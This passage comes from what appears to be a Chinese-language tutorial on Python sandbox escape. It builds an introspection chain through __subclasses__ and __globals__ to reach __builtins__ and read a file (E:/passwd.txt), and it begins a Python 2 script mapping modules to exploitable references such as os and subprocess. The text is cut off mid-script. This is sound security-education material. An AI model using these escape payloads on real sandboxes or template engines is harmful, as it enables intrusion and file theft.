<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">64 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt;</span><br><span class="line">65 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt;</span><br><span class="line">66 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt;</span><br><span class="line">67 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt;</span><br><span class="line">68 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt;</span><br><span class="line">79 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;</span><br><span class="line">80 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt;</span><br><span class="line">81 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt;</span><br><span class="line">83 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt;</span><br><span class="line">92 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;</span><br><span class="line">93 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;</span><br><span class="line">94 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt;</span><br><span class="line">95 &lt;class &#39;codecs.StreamRecoder&#39;&gt;</span><br><span class="line">96 &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;</span><br><span class="line">97 &lt;class &#39;_weakrefset.WeakSet&#39;&gt;</span><br><span class="line">118 &lt;class &#39;os._wrap_close&#39;&gt;</span><br><span class="line">119 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt;</span><br><span class="line">120 &lt;class &#39;_sitebuiltins._Printer&#39;&gt;</span><br></pre></td></tr></table></figure>

<p>重载过的<strong>init</strong>类的类具有<strong>globals</strong>属性，这里以WarningMessage为例，会返回很多dict类型：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#python2</span><br><span class="line">[].__class__.__mro__[1].__subclasses__()[59].__init__.__globals__</span><br><span class="line"></span><br><span class="line">#python3</span><br><span class="line">[].__class__.__mro__[1].__subclasses__()[64].__init__.__globals__</span><br></pre></td></tr></table></figure>
<p>寻找keys中的<strong>builtins</strong>来查看引用，这里同样会返回很多dict类型：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#python2</span><br><span class="line"> [].__class__.__mro__[1].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;]</span><br></pre></td></tr></table></figure>
<p>再在keys中寻找可利用的函数即可，如file()函数为例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#python2</span><br><span class="line">[].__class__.__mro__[1].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;E:&#x2F;passwd.txt&#39;).read()</span><br></pre></td></tr></table></figure>
<p>至此，整个元素链调用的构造过程就走了一遍了，下面看看还有哪些可利用的函数。<br>使用脚本遍历其他逃逸方法<br>Python2的脚本如下：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># coding=UTF-8</span></span><br><span class="line"></span><br><span class="line">find_modules = &#123;<span class="string">'filecmp'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'heapq'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'code'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'hotshot'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'distutils'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'functools'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'random'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'tty'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'subprocess'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'sysconfig'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'whichdb'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'runpy'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'pty'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'plat-atheos'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'xml'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'sgmllib'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'importlib'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'UserList'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'tempfile'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'mimify'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'pprint'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'platform'</span>: [<span class="string">'os'</span>, <span class="string">'platform'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'collections'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'cProfile'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'smtplib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'compiler'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'compile'</span>],</span><br><span class="line">                <span class="string">'string'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'SocketServer'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'plat-darwin'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'zipfile'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'repr'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'wave'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'curses'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'antigravity'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'plat-irix6'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'plat-freebsd6'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'plat-freebsd7'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'plat-freebsd4'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'plat-freebsd5'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'plat-freebsd8'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'aifc'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</span><br><span class="line">                <span class="string">'sndhdr'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'cookielib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'ConfigParser'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'httplib'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'_MozillaCookieJar'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'bisect'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'decimal'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'cmd'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'binhex'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'sunau'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</span><br><span class="line">                <span class="string">'pydoc'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'plat-riscos'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'token'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'Bastion'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'msilib'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'shlex'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'quopri'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'multiprocessing'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'dummy_threading'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'dircache'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'asyncore'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'pkgutil'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'compileall'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'SimpleHTTPServer'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'locale'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'chunk'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'macpath'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'popen2'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'mimetypes'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'toaiff'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'atexit'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'pydoc_data'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'tabnanny'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'HTMLParser'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'encodings'</span>: [<span class="string">'codecs'</span>, <span class="string">'__builtins__'</span>], <span class="string">'BaseHTTPServer'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'calendar'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'mailcap'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'plat-unixware7'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'abc'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'plistlib'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'bdb'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'py_compile'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'compile'</span>],</span><br><span class="line">                <span class="string">'pipes'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'rfc822'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'tarfile'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'struct'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'urllib'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'fpformat'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'re'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'compile'</span>], <span class="string">'mutex'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'ntpath'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'UserString'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'new'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'formatter'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'email'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'cgi'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'ftplib'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'plat-linux2'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'ast'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'optparse'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'UserDict'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'inspect'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'mailbox'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'Queue'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'fnmatch'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'ctypes'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'codecs'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'getopt'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'md5'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'cgitb'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'commands'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'logging'</span>: [<span class="string">'os'</span>, <span class="string">'codecs'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'socket'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'plat-irix5'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'sre'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'compile'</span>],</span><br><span class="line">                <span class="string">'ensurepip'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'DocXMLRPCServer'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'traceback'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'netrc'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'wsgiref'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'plat-generic'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'weakref'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'ihooks'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'telnetlib'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'doctest'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'pstats'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'smtpd'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'_pyio'</span>: [<span class="string">'os'</span>, <span class="string">'codecs'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</span><br><span class="line">                <span class="string">'dis'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'os'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</span><br><span class="line">                <span class="string">'pdb'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'this'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'base64'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'os2emxpath'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'glob'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'unittest'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'dummy_thread'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'fileinput'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'__future__'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'robotparser'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'plat-mac'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'_threading_local'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'_LWPCookieJar'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'wsgiref.egg-info'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'sha'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'sre_constants'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'json'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'Cookie'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'tokenize'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'plat-beos5'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'rexec'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'lib-tk'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'textwrap'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'fractions'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'sqlite3'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'posixfile'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</span><br><span class="line">                <span class="string">'imaplib'</span>: [<span class="string">'subprocess'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'xdrlib'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'imghdr'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'macurl2path'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'_osx_support'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'webbrowser'</span>: [<span class="string">'os'</span>, <span class="string">'subprocess'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</span><br><span class="line">                <span class="string">'plat-netbsd1'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'nturl2path'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'tkinter'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'copy'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'pickletools'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'hashlib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'anydbm'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'keyword'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'timeit'</span>: [<span class="string">'timeit'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'uu'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'StringIO'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'modulefinder'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'stringprep'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'markupbase'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'colorsys'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'shelve'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'multifile'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'sre_parse'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'pickle'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'plat-os2emx'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'mimetools'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'audiodev'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'copy_reg'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'sre_compile'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'compile'</span>], <span class="string">'CGIHTTPServer'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'idlelib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'site'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'getpass'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'imputil'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'bsddb'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'contextlib'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'numbers'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'io'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</span><br><span class="line">                <span class="string">'plat-sunos5'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'symtable'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'pyclbr'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'shutil'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'lib2to3'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'threading'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'dbhash'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</span><br><span class="line">                <span class="string">'gettext'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'dumbdbm'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</span><br><span class="line">                <span class="string">'_weakrefset'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'_abcoll'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'MimeWriter'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'test'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'opcode'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'csv'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'nntplib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'profile'</span>: [<span class="string">'os'</span>, <span 